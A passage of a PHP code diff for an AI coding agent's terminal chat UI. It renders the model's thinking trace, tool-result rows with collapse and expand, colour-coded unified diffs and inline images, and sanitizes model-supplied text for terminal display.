+            return $row;
+        }
+
+        return $row . "\n" . implode("\n", array_map(
+            static fn(string $line): string => $faint->render($line),
+            $lines,
+        ));
+    }
+
+    /**
+     * The in-flight thought while the model is still thinking: the trace
+     * itself, newlines kept, under a `💭 Thinking…` marker - so the user reads
+     * the thought as it is written rather than watching a spinner.
+     *
+     * Bounded to the newest $rowBudget WRAPPED rows, with an honest
+     * {@see THINKING_LIVE_TRAILER} saying how much is shown: the transcript is
+     * tail-clipped to the viewport, so rows past it are pure repaint cost on
+     * a trace that can run to tens of thousands of characters. The tail is
+     * the end that is kept because it is the end still moving.
+     */
+    private static function renderLiveThinking(string $reasoning, Theme $theme, int $width, int $rowBudget): string
+    {
+        $lines = self::thoughtLines($reasoning);
+        $total = count($lines);
+
+        $kept = [];
+        $rows = 0;
+        for ($i = $total - 1; $i >= 0; $i--) {
+            $cost = max(1, (int) ceil(Width::of($lines[$i]) / max(1, $width)));
+            if ($kept !== [] && $rows + $cost > $rowBudget) {
+                break;
+            }
+            array_unshift($kept, $lines[$i]);
+            $rows += $cost;
+        }
+
+        $faint = self::dim($theme);
+        $marker = self::dim($theme)->italic()->render('💭 ' . Lang::t('tui.chat.thinking_live'));
+        if (count($kept) < $total) {
+            $marker .= $faint->render(' ' . Lang::t(self::THINKING_LIVE_TRAILER, ['shown' => count($kept), 'total' => $total]));
+        }
+
+        return $marker . "\n" . implode("\n", array_map(
+            static fn(string $line): string => $faint->render($line),
+            $kept,
+        ));
+    }
+
+    /**
+     * A thought's display lines: scrubbed, tabs expanded (a raw TAB measures
+     * zero cells but the terminal advances it to the next stop, which would
+     * push the row past the pane), right-trimmed, and with the runs of blank
+     * lines providers pad a trace with folded to one.
+     *
+     * @return list<string>
+     */
+    private static function thoughtLines(string $reasoning): array
+    {
+        $text = trim(str_replace("\t", '    ', self::untrusted($reasoning)));
+        $text = (string) preg_replace("/\n{3,}/", "\n\n", str_replace(["\r\n", "\r"], "\n", $text));
+
+        return array_map('rtrim', explode("\n", $text));
+    }
+
+    /**
+     * The badge a tool row wears once the model is no longer sent its output
+     * (roadmap 3.B-3): `⊟ distilled` for one the model replaced with its own
+     * text, `⊟ pruned` for one a placeholder stands in for — by a strategy,
+     * `/sweep` or the model's `Prune` alike. Null for a row the ledger leaves
+     * as it is, and for one whose call's INPUT was elided instead (the
+     * output is still sent).
+     */
+    private static function pruneBadge(?\SugarCraft\Code\Context\Pruning\ContextLedger $ledger, \SugarCraft\Code\ToolResult $result): ?string
+    {
+        $entry = $ledger === null || $result->id === null ? null : $ledger->prune($result->id);
+        if ($entry === null || $entry->kind->rewritesInput()) {
+            return null;
+        }
+
+        return '⊟ ' . Lang::t($entry->kind === \SugarCraft\Code\Context\Pruning\PruneKind::Distilled ? 'tui.tool.distilled' : 'tui.tool.pruned');
+    }
+
+    /**
+     * A message carrying {@see ToolResult}s (see {@see Message::withToolResults()})
+     * gets a distinct "🔧 tool" marker per result instead of the plain
+     * assistant bubble {@see renderHistory()} uses for real replies -
+     * otherwise a tool call is visually indistinguishable from the model's
+     * own words, which is exactly what made tool execution look silent.
+     *
+     * A result that carries a unified diff ({@see ToolResult::hasDiff()} -
+     * `Edit`/`Write` produce one, see `Tools\BuiltIn\Edit::unifiedDiff()`)
+     * additionally gets that diff painted below the marker, per crush_feat.md
+     * §1 E3. The diff is consumed verbatim from the result; it is never
+     * recomputed here, because the renderer has neither the pre-edit file
+     * contents nor any business touching the filesystem.
+     *
+     * A result carrying image bytes ({@see ToolResult::hasImage()} - the
+     * `/doctor` built-in is a real producer) additionally gets the picture
+     * itself painted below the marker, via {@see renderToolPicture()}
+     * (crush_feat.md §9 E3), but only once the user has EXPANDED that call.
+     *
+     * User-reported: running `/doctor` "shows just a big green box for output,
+     * nothing else, not collapsable or expandable". Two causes, both fixed
+     * here. First, a picture is budgeted a whole viewport minus two rows
+     * ({@see renderView()}), and the transcript is tail-clipped, so an
+     * unconditional picture EVICTED its own icon+name row - the box arrived
+     * with nothing identifying it. Second, the image bypassed §1 E5's
+     * collapse machinery entirely, so Ctrl+O (and the click zone that shares
+     * its key) genuinely did nothing to it. An image-bearing result therefore
+     * now collapses exactly like a text body does: one faint
+     * {@see collapsedImageNotice()} line while collapsed, the real picture
+     * once expanded.
+     *
+     * The same result's text is that picture's only caption (`/doctor`
+     * returns a real summary string saying which protocol was detected), so -
+     * like an error body, and unlike an ordinary successful one - it is kept
+     * rather than hidden when the call is collapsed. A captionless swatch is
+     * what read as a glitch in the first place.
+     *
+     * Bodies are no longer dumped in full forever (crush_feat.md §1 E5). A
+     * SUCCESSFUL result is the case where the output is least likely to be
+     * worth screen space - the model already read it, and the user mostly
+     * needs to know the call happened - so its body is hidden entirely until
+     * the tool-call id appears in $expanded ({@see Chat::toggleToolOutput()},
+     * Ctrl+O). An ERROR body is never hidden, because that is precisely the
+     * output the user is looking for, but it is still clipped through
+     * {@see collapseToolOutput()} so a multi-megabyte stderr can't evict the
+     * conversation it belongs to. Expanding shows the body verbatim.
+     *
+     * A result that never ran gets its own visual state rather than the
+     * generic error one (crush_feat.md §1 E7): both a refusal
+     * ({@see Chat::isDeniedResult()} - the user rejected the prompt, or a
+     * hook/permission gate stopped it) and a restart-orphaned call
+     * ({@see Chat::isInterruptedResult()}) draw the icon+name row STRUCK
+     * THROUGH. The body is left un-struck because for these two states the
+     * body is the reason, which is exactly what the user needs to read.
+     *
+     * @param array<string, bool> $expanded {@see Chat::expanded()}
+     */
+    private static function renderToolResults(Message $msg, Theme $theme, int $width, array $expanded, ImageLayer $images, ?Mosaic $mosaic, int $imageRows, ?\SugarCraft\Code\Agents\Live\AgentLiveRegistry $agents = null, ?\SugarCraft\Code\Context\Pruning\ContextLedger $ledger = null): string
+    {
+        $lines = [];
+        // The thought that led to this call (parked on its placeholder by
+        // Chat::pumpLiveToolEvents()), as the same collapsible row a settled
+        // turn gets - ABOVE the call, because the model thought and then acted.
+        if ($msg->reasoning !== null && trim($msg->reasoning) !== '') {
+            $lines[] = self::renderThought($msg->reasoning, $theme, $expanded, self::thoughtKey($msg->reasoning));
+        }
+        foreach ($msg->toolResults as $result) {
+            // The name is model-chosen, not ours: Chat::executeToolCall() copies
+            // it verbatim off the parsed tool call, so an unknown-tool reply can
+            // carry an OSC title-set or a screen-clear. Unlike assistant
+            // Markdown it has no legitimate SGR of its own, so it takes the full
+            // {@see untrusted()} scrub rather than only the sentinel strip -
+            // folded to one row by {@see oneLine()}, since a CR in it is now an
+            // LF that would otherwise split the single-line click zone.
+            // A refused or interrupted call is not just a failed one: it never
+            // ran, so its whole icon+text row is struck through rather than
+            // merely recoloured (crush_feat.md §1 E7).
+            $denied = Chat::isDeniedResult($result);
+            $stopped = $denied || Chat::isInterruptedResult($result);
+            $status = match (true) {
+                $denied            => Style::new()->foreground($theme->systemLabel)->bold()->strikethrough()->render('⊘ ' . Lang::t('tui.tool.denied')),
+                $stopped           => Style::new()->foreground($theme->systemLabel)->bold()->strikethrough()->render('⊘ ' . Lang::t('tui.tool.interrupted')),
+                $result->isError() => Style::new()->foreground($theme->systemLabel)->bold()->render('✗ ' . Lang::t('tui.tool.error')),
+                default            => Style::new()->foreground($theme->assistantLabel)->bold()->render('✓ ' . Lang::t('tui.tool.ok')),
+            };
+            // Roadmap 3.B-3: the model is no longer sent this output — the
+            // ledger replaced it with a placeholder, or with the model's own
+            // distillation. Part of the status, so the bound below makes room
+            // for it; the row and its body are untouched (Ctrl+O still shows
+            // what the tool printed).
+            $badge = self::pruneBadge($ledger, $result);
+            if ($badge !== null) {
+                $status .= ' ' . self::dim($theme)->render($badge);
+            }
+            // The name is model-chosen and arbitrarily long, and this row is a
+            // single-line click zone: {@see markToolCalls()} finds it by
+            // `str_contains()` on the label recorded just below, so a label
+            // wider than the pane would either be wrapped (splitting it across
+            // two rows and losing the zone) or truncated with the recorded
+            // string no longer present in the row. Bounding the NAME keeps the
+            // label a verbatim, in-pane prefix of the rendered row - the same
+            // discipline {@see toolCallSuffix()} applies to the description.
+            //
+            // Every term here is load-bearing and none of them is observable as
+            // a WIDTH, because {@see hardFit()} holds the pane whatever this
+            // computes - the row is simply in-pane because it was CUT. So the
+            // bound's real job is that the cut NEVER HAS TO FIRE: dropping the
+            // `- 1` (the space between head and status) makes the row exactly
+            // one cell too wide and the cut shaves the status word's last cell;
+            // dropping `- Width::of($status)` makes it $status too wide and the
+            // cut eats the whole word the strikethrough is explaining. Both are
+            // pinned by
+            // PaneWidthInvariantTest::testAToolRowArrivesAtTheFitterAlreadyFittingSoTheCutNeverHasToFire().
+            // The `max(1, ...)` clamp matters only over widths 20-23, where the
+            // 9-cell prefix plus a 13-cell "interrupted" plus the space already
+            // exhaust the pane; relaxing it to `max(0, ...)` renders
+            // `🔧 tool:  ⊘ interrupted` - one cell NARROWER, so every width
+            // assertion still passes and the row has lost the only thing on it
+            // naming the tool. Pinned by
+            // PaneWidthInvariantTest::testTheNarrowestToolRowKeepsAtLeastOneCellOfItsName().
+            // Lane B (skills-qa F1): a Skill row prints the skill it loaded -
+            // `✨ skill: review` - because `🔧 tool: Skill` named the tool and
+            // never said what ran. The name rides the result's arguments on
+            // both settle paths; when they carry none (old transcripts, a call
+            // with no usable name), the row falls back to the generic head.
+            // The prefix swap keeps every law above intact: the head is still
+            // the verbatim row prefix, and $labelRoom reads the ACTUAL prefix.
+            $skillName = SkillMentions::invokedSkillName($result);
+            $prefix = $skillName === null ? self::toolRowPrefix() : self::skillRowPrefix();
+            $labelRoom = $width - Width::of($prefix) - Width::of($status) - 1;
+            $name = Width::truncate(self::oneLine($skillName ?? $result->name), max(1, $labelRoom));
+            $head = self::dim($theme)->strikethrough($stopped)->render($prefix . $name);
+            $label = $head . ' ' . $status;
+            // Recorded for the LAYOUT question, before and regardless of
+            // whether this row can also become a click zone: fitToPane() has to
+            // know a tool row when it sees one even with the mouse off, or the
+            // row is wrapped into a lookalike second line. See $toolRowHeads.
+            self::$toolRowHeads[] = $head;
+            $row = $label . self::toolCallSuffix($result, $theme, $width, Width::of($label));
+            $rawBody = $result->isError() ? ($result->error ?? '') : $result->result;
+            $key = $result->id ?? $result->name;
+            $isExpanded = ($expanded[$key] ?? self::toolOutputExpandedByDefault()) === true;
+            // §8 E5: the same key Ctrl+O toggles, so a click and the keystroke
+            // drive one expansion mechanism rather than two.
+            // The HEAD, not the whole label: the row is located by
+            // `str_contains()` and only the head is guaranteed to survive
+            // {@see fitToPane()}'s truncation. Below ~26 columns the status word
+            // alone ("⊘ interrupted" is 13 cells) leaves the bounded name no
+            // room, so the assembled label overflows the pane even at a
+            // one-character name; recording the head keeps the row clickable
+            // there instead of losing the zone to the cut. It is still a
+            // verbatim PREFIX of the rendered row, which is what keeps
+            // click-to-expand pointing at the right line, and rows are still
+            // matched in emission order (see {@see markToolCalls()}).
+            self::recordToolCallZone($key, $head);
+
+            $hasImage = $result->hasImage();
+
+            $block = $row;
+            // Roadmap P-B2: a settled Task row keeps its run's line — how it
+            // ended, what it cost — directly under the head, where the live
+            // line stood while it ran. Timed by the row's own duration when
+            // it has one: the frames' clock is the parent's, and on the
+            // settled-queue path it reads the replay, not the run.
+            if ($agents !== null && $result->id !== null) {
+                $block .= self::agentLines(
+                    $agents->forCall($result->id),
+                    $theme,
+                    $width,
+                    $agents,
+                    $result->durationMs === null ? null : $result->durationMs / 1000,
+                    settled: true,
+                );
+            }
+            // Expanded, a row says WHAT ran before what it printed: the head's
+            // one-liner is bounded and, when the model sent a `description`,
+            // never names the command at all.
+            if ($isExpanded) {
+                $invocation = self::renderInvocation($result, $theme);
+                if ($invocation !== '') {
+                    $block .= "\n" . $invocation;
+                }
+            }
+            $keepWhenCollapsed = $result->isError() || $hasImage;
+            if (!$isExpanded && !$keepWhenCollapsed) {
+                // A hidden body shows only its line count, so the whole
+                // sanitized body is not needed for it (audit 15b-10).
+                $hiddenLines = self::hiddenBodyLineCount($rawBody);
+                if ($hiddenLines > 0) {
+                    $block .= "\n" . self::hiddenBodyHint($hiddenLines, $theme);
+                }
+            } else {
+                $body = self::untrusted($rawBody);
+                if ($body !== '') {
+                    $block .= "\n" . self::renderToolBody($body, $keepWhenCollapsed, $isExpanded, $theme);
+                }
+            }
+
+            if ($result->hasDiff()) {
+                $block .= "\n" . self::renderDiff((string) $result->diff, $theme, $width);
+            }
+
+            if ($hasImage) {
+                $picture = self::renderToolPicture($result, $theme, $width, $images, $mosaic, $imageRows, $isExpanded);
+                if ($picture !== '') {
+                    $block .= "\n" . $picture;
+                }
+            }
+
+            $lines[] = $block;
+        }
+
+        return implode("\n\n", $lines);
+    }
+
+    /**
+     * The " — <what actually ran>" tail appended to a finished tool row.
+     *
+     * User-reported gap behind crush_feat.md §3 E2: the running placeholder
+     * has always shown {@see Message::describeToolCall()}'s one-liner (e.g.
+     * `bash(command: "ls -la")`, or the model-authored description when the
+     * turn sent one), but the finished row replaced it with just the tool
+     * NAME - so once §1 E5's collapse hid the body, a row said `bash ✓ ok`
+     * and never which command that was. {@see Chat} now carries the
+     * placeholder's one-liner onto the result ({@see ToolResult::$description})
+     * and this is where it reaches the user.
+     *
+     * Appended AFTER the status rather than between name and status on
+     * purpose: {@see recordToolCallZone()} registers the un-suffixed label and
+     * {@see markToolCalls()} locates the row by `str_contains()`, so keeping
+     * the recorded label a verbatim PREFIX of the rendered row is what keeps
+     * click-to-expand pointing at the right line.
+     *
+     * The string is model-authored, so it is {@see oneLine()}-scrubbed (it
+     * was already flattened to one line upstream by
+     * {@see Message::describeToolCall()}, but this renderer never trusts that)
+     * and hard-truncated to whatever the row has left, preserving the
+     * one-logical-line-per-row invariant {@see renderDiff()} documents. Returns
+     * '' when there is no description or no room for a useful amount of it -
+     * a couple of columns of an elided command is worse than none.
+     *
+     * @param int $used display columns the label already occupies on this row
+     */
+    private static function toolCallSuffix(ToolResult $result, Theme $theme, int $width, int $used): string
+    {
+        if (!$result->hasDescription()) {
+            return '';
+        }
+
+        $separator = ' — ';
+        $room = $width - $used - Width::of($separator);
+        if ($room < self::TOOL_DESCRIPTION_MIN_COLS) {
+            return '';
+        }
+
+        $text = Width::truncate(self::oneLine((string) $result->description), $room);
+        if (trim($text) === '') {
+            return '';
+        }
+
+        return self::dim($theme)->render($separator . $text);
+    }
+
+    /**
+     * The picture half of an image-bearing tool result, under §1 E5's
+     * collapse policy: the real {@see renderToolImage()} encode once the
+     * user has expanded the call, a one-line {@see collapsedImageNotice()}
+     * affordance until then.
+     *
+     * Gating here rather than inside {@see renderToolImage()} keeps the
+     * expensive path honest: a collapsed picture is never decoded, never
+     * encoded and never registered with the {@see ImageLayer}, so a
+     * transcript full of screenshots costs one faint line each per frame.
+     *
+     * Returns '' with no protocol at all, in BOTH states: with a null
+     * {@see Chat::mosaic()} expanding could only ever reveal nothing, and an
+     * affordance promising a picture that cannot exist is worse than silence.
+     */
+    private static function renderToolPicture(ToolResult $result, Theme $theme, int $width, ImageLayer $images, ?Mosaic $mosaic, int $imageRows, bool $isExpanded): string
+    {
+        if ($mosaic === null) {
+            return '';
+        }
+
+        return $isExpanded
+            ? self::renderToolImage($result, $theme, $width, $images, $mosaic, $imageRows)
+            : self::collapsedImageNotice($result, $theme, $width);
+    }
+
+    /**
+     * The collapsed stand-in for a tool result's picture: `🖼 20×10 sixel
+     * image hidden (ctrl+o)`.
+     *
+     * Names the source's pixel dimensions and the protocol it will be painted
+     * with, because the two questions a hidden picture raises are "how big is
+     * it" and "will my terminal even show it" - the second being the entire
+     * point of the `/doctor` swatch this was reported against.
+     *
+     * Dimensions come from `getimagesizefromstring()` (header only, no
+     * bitmap decode - a collapsed row must stay cheap) and are simply omitted
+     * when the header is unreadable; the expand path reports the real failure.
+     * The protocol string is truncated with the rest of the line to preserve
+     * the one-logical-line-per-row invariant.
+     */
+    private static function collapsedImageNotice(ToolResult $result, Theme $theme, int $width): string
+    {
+        $size = @getimagesizefromstring((string) $result->imageBytes);
+        $dimensions = \is_array($size) && $size[0] > 0 && $size[1] > 0 ? "{$size[0]}×{$size[1]} " : '';
+        $protocol = $result->imageProtocol === null || $result->imageProtocol === ''
+            ? ''
+            : self::oneLine($result->imageProtocol) . ' ';
+
+        $text = Width::truncate('🖼 ' . $dimensions . $protocol . Lang::t('tui.tool.image_hidden'), max(1, $width));
+
+        return self::dim($theme)->render($text);
+    }
+
+    /**
+     * Paint one image-bearing {@see ToolResult}'s bytes at the terminal's best
+     * available protocol (crush_feat.md §9 E3), following the exact pattern
+     * `sugar-gallery/src/PosterCard.php` proves out.
+     *
+     * Two shapes come back out of sugar-image and they are composed
+     * differently: an inline renderer (half-block / quarter-block / ASCII)
+     * emits ordinary styled cells that go straight into the frame, while a
+     * pixel-graphics renderer (Sixel / Kitty / iTerm2) emits an out-of-band
+     * escape blob that would corrupt the line-diff if it were concatenated -
+     * that one is handed to {@see ImageLayer::place()}, which parks the bytes
+     * on the layer and returns a same-sized marker block to occupy the frame
+     * instead. {@see Mosaic::isInline()} is the switch; the fallback ladder
+     * behind it (Kitty > iTerm2 > Sixel > chafa > half-block) is
+     * {@see Mosaic::auto()}'s job, already decided before this call.
+     *
+     * Returns '' when no {@see Mosaic} is wired - a {@see Chat} built without
+     * one (any direct `new Chat(...)`, as opposed to `Cli\Bootstrap::chat()`)
+     * has no probed capability, and guessing a protocol for an unprobed
+     * terminal would spray raw escape bytes at a terminal that cannot decode
+     * them. The result's own text still renders; only the picture is skipped.
+     *
+     * Decoding is wrapped because `view()` runs on every frame and must never
+     * throw: bytes reach here straight from a tool (possibly truncated, a
+     * non-image, or a format this build of ext-gd cannot decode), and a
+     * corrupt screenshot must cost one line of the transcript, not the
+     * session.
+     *
+     * Both the decode and the encode are memoized in {@see $imageCache} because
+     * this runs on every frame; only the (cheap) {@see ImageLayer::place()}
+     * registration is redone per frame, since placement ids are positional to
+     * the frame being built.
+     *
+     * @param int $imageRows tallest box to encode at. The height derived from
+     *                       the aspect ratio is clamped to it so one tall source
+     *                       (a full-page screenshot is easily 100+ cells high)
+     *                       cannot blow up the encode cost for rows that
+     *                       {@see renderView()}'s tail-clipping then discards.
+     */
+    private static function renderToolImage(ToolResult $result, Theme $theme, int $width, ImageLayer $images, ?Mosaic $mosaic, int $imageRows): string
+    {
+        if ($mosaic === null) {
+            return '';
+        }
+
+        $bytes = (string) $result->imageBytes;
+        // Never wider than the pane: a marker block wider than $width would
+        // take fitToPane()'s wrap branch, whose rtrim deletes the padding the
+        // runtime paints the picture over. The content width can now be as
+        // small as 1 (audit 15b-09), so the old floor of 8 is gone.
+        $cols = max(1, min(self::IMAGE_COLS, $width));
+        $rows = self::imageRows($bytes, $cols, $imageRows);
+        $key = hash('xxh3', $bytes) . ':' . $cols . 'x' . $rows . ':' . $mosaic->protocol();
+
+        if (isset(self::$imageCache[$key])) {
+            $hit = self::$imageCache[$key];
+            // Re-insert so eviction drops the picture that scrolled away, not
+            // the one being repainted every frame.
+            unset(self::$imageCache[$key]);
+            self::$imageCache[$key] = $hit;
+        } else {
+            try {
+                $hit = ['ok' => true, 'body' => $mosaic->render(ImageSource::fromString($bytes), $cols, $rows)];
+            } catch (\Throwable $e) {
+                $hit = ['ok' => false, 'body' => self::dim($theme)
+                    ->render('🖼 ' . Lang::t('tui.tool.image_unavailable', ['error' => self::oneLine($e->getMessage())]))];
+            }
+
+            self::$imageCache[$key] = $hit;
+            if (\count(self::$imageCache) > self::IMAGE_CACHE_MAX) {
+                array_shift(self::$imageCache);
+            }
+        }
+
+        if (!$hit['ok']) {
+            return $hit['body'];
+        }
+
+        return $mosaic->isInline() ? $hit['body'] : $images->place($hit['body'], $cols, $rows);
+    }
+
+    /**
+     * Cell height for an image of $bytes drawn $cols wide, clamped to $budget.
+     *
+     * Split out of {@see renderToolImage()} so the cheap header-only dimension
+     * probe stays outside that method's cache lookup - the height is part of
+     * the cache key, so it has to be known before the key is built, and
+     * `getimagesizefromstring()` reads the header only rather than decoding the
+     * whole bitmap the way {@see ImageSource::fromString()} does.
+     *
+     * Falls back to a square box when the header is unreadable: the real
+     * decode is about to fail anyway, and this only has to produce a stable
+     * cache key for that failure.
+     */
+    private static function imageRows(string $bytes, int $cols, int $budget): int
+    {
+        $size = @getimagesizefromstring($bytes);
+        $aspect = \is_array($size) && $size[0] > 0 && $size[1] > 0 ? $size[0] / $size[1] : 1.0;
+
+        // Cells are about twice as tall as they are wide, so the /2 is what
+        // keeps a square image square rather than doubled in height.
+        return max(1, min((int) round($cols / $aspect / 2), $budget));
+    }
+
+    /**
+     * One tool result's body under the collapse/expand policy documented on
+     * {@see renderToolResults()}: verbatim when expanded, a faint one-line
+     * "N lines hidden" affordance when a collapsed call's body is worth
+     * hiding, and a {@see collapseToolOutput()}-clipped excerpt (plus
+     * trailer) when it is not.
+     *
+     * @param bool $keepWhenCollapsed the body survives collapsing (clipped
+     *                                rather than hidden) because it is the
+     *                                thing the user is looking for: an error's
+     *                                reason, or the caption of a picture whose
+     *                                own rendering is collapsed alongside it
+     */
+    private static function renderToolBody(string $body, bool $keepWhenCollapsed, bool $isExpanded, Theme $theme): string
+    {
+        if ($isExpanded) {
+            return $body;
+        }
+
+        if (!$keepWhenCollapsed) {
+            return self::hiddenBodyHint(substr_count($body, "\n") + 1, $theme);
+        }
+
+        $collapsed = self::collapseToolOutput($body, self::toolOutputPreviewLines(), self::TOOL_OUTPUT_MAX_CHARS);
+        if (!$collapsed['overflow']) {
+            return $collapsed['output'];
+        }
+
+        return $collapsed['output'] . "\n"
+            . self::dim($theme)->render(Lang::t('tui.tool.output_truncated'));
+    }
+
+    /** The faint "N lines hidden" row that stands in for a collapsed body. */
+    private static function hiddenBodyHint(int $count, Theme $theme): string
+    {
+        return self::dim($theme)->render(Lang::t($count === 1 ? 'tui.tool.hidden_line' : 'tui.tool.hidden_lines', ['count' => $count]));
+    }
+
+    /**
+     * How many rows `untrusted($raw)` has, or 0 when it is empty: the only
+     * facts a hidden tool body puts on screen. Memoized in
+     * {@see $hiddenBodyMemo} by a hash of the raw body (audit 15b-10).
+     *
+     * Every tool row in the transcript is rebuilt on every frame, and most
+     * of them are collapsed. Sanitizing each one's output again on each frame
+     * was the largest cost left in {@see renderHistory()}, and a tool body is
+     * the one input in a transcript that can be megabytes. Hashing the raw
+     * body is much cheaper than sanitizing it, and the sanitizer is a pure
+     * function, so the count is too.
+     */
+    private static function hiddenBodyLineCount(string $raw): int
+    {
+        if ($raw === '') {
+            return 0;
+        }
+        $key = strlen($raw) . ':' . hash('xxh128', $raw);
+        if (isset(self::$hiddenBodyMemo[$key])) {
+            return self::$hiddenBodyMemo[$key];
+        }
+
+        $body = self::untrusted($raw);
+        $count = $body === '' ? 0 : substr_count($body, "\n") + 1;
+        if (\count(self::$hiddenBodyMemo) >= self::MARKDOWN_MEMO_MAX) {
+            self::$hiddenBodyMemo = \array_slice(self::$hiddenBodyMemo, self::MARKDOWN_MEMO_MAX >> 1, null, true);
+        }
+
+        return self::$hiddenBodyMemo[$key] = $count;
+    }
+
+    /**
+     * Clip a tool's raw output to at most $maxLines lines AND $maxChars
+     * characters, reporting whether anything was dropped (crush_feat.md
+     * §1 E5).
+     *
+     * Deliberately a pure function over plain strings - no Theme, no Style,
+     * no Chat - so the clipping policy is unit-testable on its own and can be
+     * reused by any other surface that has to show tool output.
+     *
+     * The line budget is applied before the character budget so a result that
+     * is short in lines but enormous in one of them still gets clipped; both
+     * limits set `overflow`. Character counting is mb_*-based because tool
+     * output is arbitrary UTF-8 and a byte-wise cut could split a codepoint
+     * and put a lone continuation byte on the terminal wire.
+     *
+     * @param int $maxLines Maximum lines to keep; values below 1 are treated as 1
+     * @param int $maxChars Maximum characters to keep; values below 1 are treated as 1
+     *
+     * @return array{output: string, overflow: bool}
+     */
+    public static function collapseToolOutput(string $output, int $maxLines, int $maxChars): array
+    {
+        if ($output === '') {
+            return ['output' => '', 'overflow' => false];
+        }
+
+        $maxLines = max(1, $maxLines);
+        $maxChars = max(1, $maxChars);
+
+        $overflow = false;
+        $rows = preg_split('/\r\n|\r|\n/', $output) ?: [];
+        if (count($rows) > $maxLines) {
+            $rows = array_slice($rows, 0, $maxLines);
+            $overflow = true;
+        }
+
+        $clipped = implode("\n", $rows);
+        if (mb_strlen($clipped) > $maxChars) {
+            $clipped = mb_substr($clipped, 0, $maxChars);
+            $overflow = true;
+        }
+
+        return ['output' => $clipped, 'overflow' => $overflow];
+    }
+
+    /**
+     * Paint a raw unified diff (`--- a/…` / `+++ b/…` / `@@ … @@` / ` `+`/`-`
+     * lines, exactly what `diff -u` emits) as a bordered, colour-coded block.
+     *
+     * Additions/removals are coloured with bare ANSI green/red rather than a
+     * {@see Theme} field: every theme in the palette agrees on what "added"
+     * and "removed" look like, and the diff has to stay readable even under
+     * the `ansi` theme, which has no room for two more accent colours.
+     *
+     * Each row is prefixed with a faint old-file/new-file line-number gutter
+     * ({@see DiffGutter}) so a reviewer can tell which line of the file a
+     * change lands on - a raw `diff -u` body only says *what* changed.
+     *
+     * Every line is {@see Sanitize::untrusted()}-stripped before display -
+     * diff bodies are verbatim file contents, so an edited file containing a
+     * raw ESC would otherwise forge SGR straight onto the terminal wire - then
+     * hard-truncated to $width so the frame keeps its one-logical-line-per-row
+     * invariant (sugar-core's Renderer repaints by absolute row; a wrapped
+     * line silently shifts every row below it). Sanitising happens BEFORE the
+     * gutter is computed, so the marker column the numbering reads is the same
+     * one that ends up on screen. Tabs are expanded in the same pass, for the
+     * width reason spelled out at the call site. The row count is capped at
+     * {@see self::DIFF_MAX_ROWS} with a trailer for the same reason
+     * {@see render()} tail-clips: a 400-line diff must not evict the
+     * conversation it belongs to.
+     */
+    private static function renderDiff(string $diff, Theme $theme, int $width): string
+    {
+        // Border (2 cols) + padding(0, 1) (2 cols) sit outside the text.
+        // Floored at 1, not 8: with an 8-cell floor the box was 12 cells wide
+        // in any pane narrower than that, and fitToPane() then wrapped its
+        // border rows apart (audit 15b-09). Every Width call below takes a
+        // budget of at least 1, and none of them is Width::wrap().
+        $inner = max(1, $width - 4);
+
+        $rows = preg_split('/\r\n|\r|\n/', rtrim($diff, "\r\n")) ?: [];
+        $maxRows = self::diffPreviewRows();
+        $overflow = count($rows) - $maxRows;
+        if ($overflow > 0) {
+            $rows = array_slice($rows, 0, $maxRows);
+        }
+
+        // TAB has to be expanded HERE, before anything measures a row.
+        // sugar-core's Sanitize::untrusted() deliberately preserves TAB, and
+        // Width::string("\t") is 0 - but sugar-style' Style::render()
+        // expands every tab to tabWidth spaces before it does its own width
+        // work (Style.php:969). So a tab-indented row (Go, Makefiles, C) is
+        // budgeted 0 cells and painted 4, and the frame emits a row wider than
+        // the viewport - the PR #1403 failure class, where sugar-core's
+        // absolute cursorTo() repaint turns an over-wide row into a status-bar
+        // collision. The expansion width is read off a default Style rather
+        // than written as a literal so it cannot drift from the styles below,
+        // which are default-constructed the same way.
+        $tab = str_repeat(' ', Style::new()->getTabWidth());
+        $rows = array_map(
+            static fn (string $row): string => str_replace("\t", $tab, self::untrusted($row)),
+            $rows,
+        );
+
+        // On a viewport too narrow to spare the columns, the diff text itself
+        // is worth more than knowing its line numbers - drop the gutter rather
+        // than truncate every row down to its marker.
+        $gutter = DiffGutter::forDiff($rows);
+        if ($inner - $gutter->width < self::DIFF_MIN_BODY_COLS) {
+            $gutter = DiffGutter::none(count($rows));
+        }
+
+        // Computed from the un-narrowed rows, and separately from $gutter, so
+        // that dropping the gutter for a narrow viewport does not also change
+        // how the body is coloured.
+        $headers = DiffGutter::fileHeaders($rows);
+
+        $body = $inner - $gutter->width;
+        $gutterStyle = self::dim($theme);
+
+        $painted = [];
+        foreach ($rows as $i => $row) {
+            $text = Width::truncate($row, $body);
+            $prefix = $gutter->prefixes[$i];
+            $painted[] = ($prefix === '' ? '' : $gutterStyle->render($prefix))
+                . self::styleDiffLine($text, $theme, $headers[$i])->render($text);
+        }
+
+        if ($overflow > 0) {
+            $trailer = Width::truncate(Lang::t($overflow === 1 ? 'tui.tool.more_diff_line' : 'tui.tool.more_diff_lines', ['count' => $overflow]), $body);
+            $painted[] = $gutterStyle->render($gutter->blank . $trailer);
+        }
+
+        return Style::new()
+            ->border(Border::normal())
+            ->borderForeground($theme->border)
+            ->padding(0, 1)
+            ->render(implode("\n", $painted));
+    }
+
+    /**
+     * The subdued colour for transcript chrome: thoughts, tool rows, tool-body
+     * hints, the running placeholder, invocation args and the diff gutter.
+     *
+     * The theme's `systemLabel` WITHOUT SGR 2 (faint). Faint used to be layered
+     * on top, and it is applied by the terminal after the fact — roughly halving
+     * the colour's brightness — so the text landed far under the
+     * {@see Theme::CONTRAST_MIN} that `systemLabel` was projected to clear, where
+     * no contrast test could see it. On dracula that turned thinking and tool
+     * rows into a barely-legible slate. The projected colour alone is already
+     * the subordinate grey; the terminal does not get to darken it further.
+     *
+     * Menu hints and the input's ghost suggestion keep their faint on purpose:
+     * they are placeholders, not content the user has to read back.
+     */
+    private static function dim(Theme $theme): Style
+    {
+        return Style::new()->foreground($theme->systemLabel);
+    }
+
+    /**
+     * The label a UI-only {@see Message::notice()} row opens with, in place of
+     * the `system: ` an agent-visible system row carries - see {@see notice()}.
+     */
+    private const NOTICE_ROW_LABEL = 'tui.chat.notice_label';
+
+    /**
+     * The style of a UI-only system row - a queued or refused prompt, a
+     * launch, runtime or background notice, a compaction report (audit 15b-03,
+     * decision N1).
+     *
+     * Notices stay INLINE, where they happened, even between a prompt and its
+     * answer: moving them would make the transcript lie about the order of
+     * events. What N1 changes is how they read. A system row the model DOES
+     * see (the 70% reminder, a hook's additional context) and a notice the
+     * model never sees used to render identically, as `system: …` in the dim
+     * colour, so nothing told the user which of the two lines in the middle of
+     * an exchange were part of the conversation. A notice now keeps the dim
